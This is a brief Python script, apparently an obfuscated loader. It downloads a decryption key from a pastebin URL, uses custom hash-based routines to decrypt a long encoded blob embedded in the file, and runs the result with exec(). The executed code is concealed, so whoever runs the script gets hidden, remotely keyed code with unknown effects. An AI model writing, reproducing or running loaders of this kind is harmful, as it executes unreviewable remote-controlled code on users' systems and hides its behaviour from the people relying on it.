####        ####
###            ####
import getpass,hashlib,base64
import requests, sys, os
def hasher(text,length,key):
    if length > 64:
       raise ValueError("hash length should be lower than 64")
    result = hashlib.sha256(text.encode("utf-8")+key.encode("utf8")+text.encode("utf8")).hexdigest()[:length][::-1]
    return result #return final result


def separator(text,length):
    return [text[i:i+length] for i in range(0,len(text),int(length))]

def decrypt(text,key):
    textsplit = text.split("!-!")
    encrypted,shuffled,hash_length,separate_length = textsplit[0].split("|")
    encrypted = separator(encrypted,int(hash_length))
    encrypted2 = separator("".join(encrypted),int(hash_length))
    shuffled = separator(shuffled,int(separate_length))
    primary_key_is_true = True
    for i in shuffled:
        hashed = hasher(i,int(hash_length),key)
        if hashed in encrypted:
           encrypted[encrypted.index(hashed)] = i

    for i in encrypted:
        if i in encrypted2 and len(textsplit) == 1:
           raise KeyError("Wrong Key")
        elif i in encrypted2:
           primary_key_is_true = False
           break

    if primary_key_is_true:
       result = base64.b64decode("".join(encrypted)[::-1])

    if len(textsplit) >= 2 and primary_key_is_true == False:
       master_key = separator(textsplit[1],int(hash_length))
       master_key2 = separator("".join(master_key),int(hash_length))
       for i in shuffled:
           hashed = hasher(i,int(hash_length),key)
           if hashed in master_key:
              master_key[master_key.index(hashed)] = i

       for i in master_key:
           if i in master_key2:
              raise KeyError("Wrong Key")
       result = base64.b64decode("".join(master_key)[::-1])
    return result

def unlock(key):
    exec (decrypt("985d46ee064f59a97ca185a90c9b18e4608e72fff75e6fec37793e8511234f5dcf5d8c6ce8f881e9df1603af94e82e542590|2dphFRBpXTxM3dPpXT6J2UJNXSsd3dNpnTi1EVzpXTyATaMNkSj1ERNp3V6F0NNpnU0lUa3lGWEFkeNFzc49keNBjYTl0cJx2d31keOJWTENneOdFMpx0QKNWTE1keXpXR30keWRXSpdXaYRUQ61UMzd3T61kMiNVSzlEb3dXT65kYNR1c65UbwkGTDp0YNRUT6dleBdTT6RGdJl2dphFRBpXTxMHePpXTzI2UKRGRRB3dZdVMsNWbG9WSEBzZhNjV51Ue0RnWYpEahN0cpBla0sSSnBzSjdkRvF2VwhGZTFUOJdEdxMmaNJXYHxWcZhVVylka0sCUplkTD5mQoF2MWVXYXVjbJREMnF2MWlXT5RnckdVNwJWbjJXSqRzKQlWSONUbs1WSHljeM5mQoR2RnVnWYhGcjNjU6t0QklmYzEVdjJzZutEVwZ3Y5VTeadVM2RWbV9mSyokdkNUN6F2QjBHRRBneZlXQ5k0RsV3YIZFMLdUWuV2MChmYXZVeZdFa5kES0dHZYJFchhUMKJmbCFDZDJ0TZdVMolkROp2Ytx2dkNUQ2k0QjBXSDF0ZJNUQnRUUwpWSEBzZhdVN3RGWR9mWpR2NjdkR0pFWKhWYIBzZlNjQxQ2Rs9mZVxWdjhkVwkUROFzYupEbi1mT1kERvdmS5t2ZJNUQnl0QB50QuJVelR1bONUaBdWSDJEajlWQ5k0R5oHTthHcjNjUrFGWJ9mSz4EbjNjTwJmM0YnS5tmTDlWQnl0QCd3YtxWdkNEatlkb0JHZYlkemhFd3RGWSBXYIFDMiNjUoJ2QCFzYyYVeJR0bpx0R4xmYphGajl2awRUUvdWSDF0ZjhkSwJmbR9WSpFUaLFFMLl0QBdWSHt2ZQNVQ3RUUvdWSDF0Za1WO5lESC9mYyUDbJdEb1l0RGl3TnBzSJNUQnl0QBdWSDJEcJREMnF2UBJXSEVkTDlWQnl0QBdWSDF0ZhdVWnN2RoZnYtVVdadVNrN2MkBHZHd2bJlWN6pFWOpXYXlTdMdFc2RGWKVXWXdXaLR1bONUaBdWSDF0ZJNUQnl0QBdWSIJUehdVNws0RZlGWIp0NjhkVwE2VolzVzQ3bhdFcoRGWwk2Sz4EMjlGawt0U01WSuR3dkhlUwFGSxQWSIR3bhdFcoRGWwsCUpJ0NjhkVwE2VolTZzI0biJTNsZ2UJBXSDFkTDlWQnl0QBdWSDF0ZJNUQnl0R5oHTupEbidVOyo1Un52YyYlejJDb2JWa442SzI0biJTNstUeJV3YyYlejJDb2JWaxEnYzYVei1mRzlUar50QpF0ZJNUQnl0QBdmWXhneaR1bONUaBdWSDF0ZJNUQnl0QBdWSIJ0biJTNslERwc2YHhmdi1WV1NWbWdnYHZkaaN1ZuxkbOx2Yz4EciJDNux0Qj52SRBzSJNUQnl0QBdWSDF0ZJNUQnRGSKVzTnBzSJNUQnl0QBdWSDF0ZJNUQnl0QBdWSIRGckd0ZnJ2MCxmYpdmbZ1WOwwkbO9mS5dnbZN1cut0UCh2Y5JEcidkR1plev50QpF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZhdFeoJWbjVHZzoEckdUVvp0MCVDZHhmdilWQut0MOp2S5N2ZKlHd3F2R5UnWTNnbJN0YylVez5GWHRjbLFFMLl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QCd3YtxWdkNEatlEb4lXZzIUMkdEbvZmV0dTYHxWcZhlV5kUa0pHZIl0bhN1aypVaKdzYIZFMhdFa5g1UCdTYHxWcZhlV5Ala0cWZzIUMkdEbvZGW0dXYHlTdahFMpt0UBdGRR92ZJNUQnl0QBdWSDF0ZJNkQsV2ROx2YIF1ZShFaqpFWCBTYXlTdJdkR6l0RVZDRR92ZJNUQnl0QBdWSDF0ZJNUQnl0QBd2YIpEci5WUvp1Ur50QpF0ZJNkQ3NWbsVHZDhWbKNDd3l1VoBXYtZUMmNlQHF2V4xWSFZkaZJTOxImbRd2YyYkMadVUnF2V0cWWtlDMM5mTvpUer50QtZFNZJjV3R2QCdUYXhHbU1WOwIVb5EjYtJlRj5mS2Nmav50QpF0ZJNkQ3NWbsVHZDdmba1Gbzp1UCtmYyYleJdUN2R2QCxWZHxmekN0YwRUUvp0JoUGZvNWZkRjNi5CN2U2chJGKjVGelpAN2U2chJGI0J3bw1Wa=kSKdFTL6ozWnE2VxcnYzoEMJdUO6RUUwBzYutmNEF1bnl0QCBnYYJkdj5WUnllM5MnYzoEaidVRONUaBdWSHpVeiJDMnllM5MnYzoEaidVRnF2VxcnYzoEMJVkW2NWbVNXSFpEaZJzczlkROBTZXhHbEF1bnl0QCpmYygndj1mR0l1U1AnYtxGMLdkRxQ2R5knWY5EbkRUMVNmbWx2SRBzSJNUQnF2RsFXWYV1ZQNlQURGSsNnWTVzUSZlTGZlR5IEVFdncVNjU1I2RVVXUspkSSBDaVtEMaZ3YtVVdSFjSGJVV040QpF0ZJhkSsNWeBlTSG5EMldFesxEbKZUVwYVVYBjRNRVQwsUSDF0ZZdlSx0UaBlTSG5EMldFesx0aSpEVTR3RiNjSsxEbkl0UWJlREF1bnl0QCdHZYJFchNUQ5kkROBTZXhHbMxmSGVFMWVFWwYUTUNEdURGSsNnWTVzQVtGbINlRRJnUtlTeaNVNYNVRsVlURBzSJNUQnlVbslHZTFUOJZkTwU2V4xGTspkRVBjVVhFMG1EVDRHVkhEbzp1U1MUVrxGSTZUUyJVb5knWTVzQUZkVGRUUvdWSDJUahhVSnB1UCRFZIx2caNVNPRVMK5UUVdncS1WO5p1U1MEVGZlREF1bnl0QCdHZYp0dJREMnV1MSVjYHVVdUtWOTRVVG10Swoldj1WV1RVVGhkUVVTVRFFMLl0QBd2YIZVejdEeslERwcWVzIVNidUV1V1aWRlUWJlZRVFeNtUMOBTZXhHbMtmSTNVVklkVDR3RiNjSsx0axIkUwY1TWVURONUaBdWSHhGch1mRx0UaBlTSG5EMldFesx0a1AVVrFjQUNEdHJ2MKxGTrR2USVlVPRUUvdWSDJEbidlR6lERwcWVzIVNidUV1R1a5MFVVZUTLBjW2NWbVV3VVZVTUVUOYRUUvdWSDJkckdVNwJWbjdGUTJEVkhEbzp1U1MlUW5kRWZUOCRVR3JXVzIVNidUV1FFbKpkUwgWVLBjW2NWbVV3VVZVTUVUOYRUUvdWSDJEdahlSoFGRFdGUTJEVkhEbzp1U18EVxokTRV1dyJVb5knWTVzUSVVUONUaBdWSHFDbj1mRvlERwcWVzIVNidUV1V1aWRlUWJlZRVFeNtUMOBTZXhHbMtmSTNVVklkVDR3RiNjSsxEbKZkUBBzSJNUQnl1MshmYpFUOJZkTwU2V4xGTrp0UTVFZJZ1Q0dkYzoEbMtmTaFVV040QpF0ZJdkT1k1V0kXSEBzZVNjU1I2RVVHVrlzUUVlRNtEMaZ3YtVVdRFDbCR1ZwsUSDF0Za1mW5lERwcWVzIVNidUV1FFbKpkUwgWVLBjW2NWbVVnUxokRSVFNylEavF2RplkTDlWQnl0R0FzYqV0ZQNlQURGSsNnWTVzQVtGbINlRRJnUtlTeaNVNTJVVRJXSsNXaEF1bnl0QCJHZYlUeJREMnV1MSVjYHVVdRxmSKJFMoV1Swoldj1WV1V1aWV0S5pEZJdGMLpFWopmWYJEMPdGMLl0QBd2YIpEci5WUnt0QKFlYHZFajJTVnN1V1oHZHZ0ciNkQOJmMSFjYDJERiJDe2NWbGRXWTVEaYdUNjJGb4VXSptmTDlWQnlESOVzY5VDbldEbws0Qr50QpF0ZJFEMLF2MWlXT5FUOJdUMsNWbG92S5pkYJlGdvF2VwhGZTNXaLlXSyJ2VWlXWXdmcJxGMpRUUwBnYtRzZQNVQphjSrIVaTlkTD5mQzRGWNdGUTJ0dkhlUwF2Qzl2V5lkchdEbxlFWVJXSpNXaLNjQxQ2Rs92S5pEZJdGMLR2RGpnWTFUOJhkQxQ2Rs92S5pkYJlGdyR2V1AnYtNmcJlWRpt0MCFDZHx2bLlnSkl0ZwsEZHZEMZNVQ5kESCFDZHx2bLlnSilUa0JHZXVDci12Yylka4k2SzIUMkdEbvtUeKRWSnBzSkdkR6F2UBlTSIJUMkdEbvtUeKJWSpRHdahlSoF2QzlWZDlkcjhkVwE2VnJXSsBTaEFFcwk1V0FTSEBzZjhkVwE2VnJXSsNXaLJDdxIWbsVnW5NXaMNVSyNGSWBTYXdmcJxGMpRUUwRnWY10ZQNlQilEb3dXT65kYNR0c610VwkWSDdXaYRUQ61UMzh3T61EeiNVSzlEb3dXT65kYNR0c61UbwkGTDp0YNRUT6dleFdTT6pEdJl|50|2202!-!5c1cdb03108375a1afb770e4d22f4c290667c783dbc19faf9a9aaf4ca51bf66401e929beeb69f8588764697a631dfc06fdbe",key),globals())

if "__main__" == __name__:
   c = requests.Session()
   key = c.get("https://pastebin.com/raw/HxGFSMKs").text
   unlock(key)
